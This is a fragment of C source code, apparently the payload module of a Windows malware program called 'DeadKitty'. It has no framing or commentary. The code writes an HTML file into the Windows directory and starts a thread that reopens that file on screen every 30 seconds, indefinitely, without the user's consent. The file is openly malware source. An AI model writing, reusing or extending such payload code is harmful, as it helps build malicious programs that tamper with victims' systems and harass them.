   /* the payload */

   #include "DeadKitty.h"

   DWORD WINAPI Th_PayLoad(LPVOID Data)
   {
       char EMO_shit[MAX_PATH];
       HANDLE fd = NULL;
       DWORD WrittenBytes;

       sprintf(EMO_shit,"%s\\Credits.html",WinDir);

       /* write all this shit */
       fd = CreateFile(EMO_shit,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,
           FILE_ATTRIBUTE_NORMAL,NULL);

       if(fd == INVALID_HANDLE_VALUE)
       {
           ExitThread(0);
       }

       WriteFile(fd,payload_HTML,strlen(payload_HTML),&WrittenBytes,NULL);
       CloseHandle(fd);

       while(1)
       {
           WAIT(30);
           ShellExecute(NULL,"open",EMO_shit,NULL,NULL,SW_SHOW);
       }
   }

   void PayLoad(void)
   {
       DWORD PayLoadId;

       /* start thread */
       CreateThread(NULL,0,&Th_PayLoad,0,0,&PayLoadId);
   }
